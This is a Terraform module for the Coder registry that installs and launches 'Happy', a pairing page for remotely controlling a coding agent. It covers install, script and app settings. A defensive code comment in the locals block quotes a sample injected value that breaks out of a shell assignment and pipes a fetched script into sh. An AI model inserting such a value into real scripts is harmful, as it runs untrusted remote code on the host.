terraform {
  required_version = ">= 1.9"

  required_providers {
    coder = {
      source  = "coder/coder"
      version = ">= 2.13"
    }
  }
}

variable "agent_id" {
  description = "The ID of a Coder agent."
  type        = string
}

variable "icon" {
  description = "The icon to use for the app."
  type        = string
  # Not "/icon/happy.svg": that path is served from Coder's own built-in
  # icon bundle (independent of this repo's .icons/ directory, which is only
  # used to render the registry website), and happy isn't in it -- pointing
  # there renders a broken image on the coder_app tile. Pinned to this fork
  # branch for now so it resolves immediately; switch to
  # "https://raw.githubusercontent.com/coder/registry/main/.icons/happy.svg"
  # once this module is merged upstream.
  default = "https://raw.githubusercontent.com/gojnimer6553/registry/add-happy-module/.icons/happy.svg"
}

variable "slug" {
  description = "The slug of the coder_app resource."
  type        = string
  default     = "happy"
}

variable "display_name" {
  description = "The display name for the Happy application and its install/start scripts."
  type        = string
  default     = "Happy"
}

variable "port" {
  description = "The port to run the Happy pairing page on."
  type        = number
  default     = 4020
}

variable "workdir" {
  description = "The directory `happy claude` runs in. Defaults to $HOME. The directory is created if it doesn't exist."
  type        = string
  default     = null
}

variable "tmux_session" {
  description = "Name of the tmux session Happy runs in. Change this only if it collides with another session name in the workspace."
  type        = string
  default     = "happy"
}

variable "install" {
  description = "Whether to install Happy. Set to false to run a pre-installed copy instead (see install_prefix)."
  type        = bool
  default     = true
}

variable "install_version" {
  description = "The npm version or dist-tag of the `happy` package to install."
  type        = string
  default     = "latest"
}

variable "use_cached" {
  description = "Skip installing when a copy already exists at install_prefix, instead of always reinstalling on start."
  type        = bool
  default     = false
}

variable "package_manager" {
  description = "Package manager used to install Happy. One of 'npm', 'pnpm', or 'bun'; must already be available on the agent."
  type        = string
  default     = "npm"

  validation {
    condition     = contains(["npm", "pnpm", "bun"], var.package_manager)
    error_message = "The 'package_manager' variable must be one of: 'npm', 'pnpm', 'bun'."
  }
}

variable "registry_url" {
  description = "The npm-compatible registry URL to install Happy from. Override this for private registries or mirrors."
  type        = string
  default     = "https://registry.npmjs.org"
}

variable "node_version" {
  description = "Node.js version to bootstrap into this module's data directory when no `node` is found on PATH. Only used as a fallback; ignored if node is already installed."
  type        = string
  default     = "22.14.0"
}

variable "install_prefix" {
  description = "Directory Happy is installed into (as a local npm/pnpm/bun package). Defaults to a path under this module's standard data directory so installs persist across workspace restarts."
  type        = string
  default     = null
}

variable "share" {
  description = "Determines visibility of the app. Must be one of 'owner', 'authenticated', or 'public'. Keep this at 'owner' unless you understand the consequences: whoever can open this app can pair a device and remotely control your coding agent."
  type        = string
  default     = "owner"

  validation {
    condition     = contains(["owner", "authenticated", "public"], var.share)
    error_message = "Incorrect value. Please set either 'owner', 'authenticated', or 'public'."
  }
}

variable "subdomain" {
  description = <<-EOT
    Determines whether the app will be accessed via its own subdomain or whether it will be accessed via a path on Coder.
    If wildcards have not been setup by the administrator then apps with "subdomain" set to true will not be accessible.
  EOT
  type        = bool
  default     = true
}

variable "open_in" {
  description = <<-EOT
    Determines where the app will be opened. Valid values are `"tab"` and `"slim-window"` (default).
    `"tab"` opens in a new tab in the same browser window.
    `"slim-window"` opens a new browser window without navigation controls.
  EOT
  type        = string
  default     = "slim-window"

  validation {
    condition     = contains(["tab", "slim-window"], var.open_in)
    error_message = "The 'open_in' variable must be one of: 'tab', 'slim-window'."
  }
}

variable "order" {
  description = "The order determines the position of app in the UI presentation. The lowest order is shown first and apps with equal order are sorted by name (ascending order)."
  type        = number
  default     = null
}

variable "group" {
  description = "The name of a group that this app belongs to."
  type        = string
  default     = null
}

variable "pre_install_script" {
  description = "Custom script to run before installing Happy. Can be used for dependency ordering between modules (e.g., waiting for git-clone to complete before Happy starts)."
  type        = string
  default     = null
}

variable "post_install_script" {
  description = "Custom script to run after installing Happy, before it starts."
  type        = string
  default     = null
}

locals {
  module_dir_name  = ".coder-modules/gojnimer6553/happy"
  module_directory = "$HOME/${local.module_dir_name}"

  # Kept as *overrides only* (empty string means "no override"), rather than
  # pre-resolving the "$HOME"-based default here as a Terraform string: the
  # scripts below need the literal "$HOME" in ARG_INSTALL_PREFIX/ARG_WORKDIR
  # to expand at shell runtime, which requires embedding them in a
  # double-quoted assignment -- but these values can also be arbitrary
  # caller-supplied strings (install_prefix, workdir), and a double-quoted
  # assignment lets a value like `foo"; curl evil.sh | sh #` break out and
  # execute. Passing only the raw override (never attacker-influenced beyond
  # being a path the caller chose) and letting the script build the "$HOME"
  # default itself from a real, un-interpolated shell variable avoids that
  # entirely.
  install_prefix_override = var.install_prefix != null ? var.install_prefix : ""
  workdir_override        = var.workdir != null ? var.workdir : ""

  install_script = templatefile("${path.module}/scripts/install.sh.tftpl", {
    ARG_INSTALL                 = tostring(var.install)
    ARG_USE_CACHED              = tostring(var.use_cached)
    ARG_VERSION                 = var.install_version
    ARG_PACKAGE_MANAGER         = var.package_manager
    ARG_REGISTRY_URL            = trimsuffix(var.registry_url, "/")
    ARG_NODE_VERSION            = var.node_version
    ARG_MODULE_DIR_NAME         = local.module_dir_name
    ARG_INSTALL_PREFIX_OVERRIDE = local.install_prefix_override
  })

  start_script = templatefile("${path.module}/scripts/start.sh.tftpl", {
    ARG_PORT                    = tostring(var.port)
    ARG_MODULE_DIRECTORY        = local.module_directory
    ARG_MODULE_DIR_NAME         = local.module_dir_name
    ARG_INSTALL_PREFIX_OVERRIDE = local.install_prefix_override
    ARG_WORKDIR_OVERRIDE        = local.workdir_override
    ARG_TMUX_SESSION            = var.tmux_session
  })
}

module "coder_utils" {
  source  = "registry.coder.com/coder/coder-utils/coder"
  version = "0.0.1"

  agent_id            = var.agent_id
  module_directory    = local.module_directory
  display_name_prefix = var.display_name
  icon                = var.icon
  pre_install_script  = var.pre_install_script
  post_install_script = var.post_install_script
  install_script      = local.install_script
  start_script        = local.start_script
}

resource "coder_app" "happy" {
  agent_id     = var.agent_id
  slug         = var.slug
  display_name = var.display_name
  url          = "http://localhost:${var.port}"
  icon         = var.icon
  subdomain    = var.subdomain
  share        = var.share
  order        = var.order
  group        = var.group
  open_in      = var.open_in

  healthcheck {
    url       = "http://localhost:${var.port}/healthz"
    interval  = 5
    threshold = 6
  }
}

# Pass-through of coder-utils script outputs so upstream modules can serialize
# their own coder_script resources behind this module's install pipeline
# using `coder exp sync want <self> <each name>`.
output "scripts" {
  description = "Ordered list of coder exp sync names for the coder_script resources this module actually creates, in run order (pre_install, install, post_install, start). Scripts that were not configured are absent from the list."
  value       = module.coder_utils.scripts
}
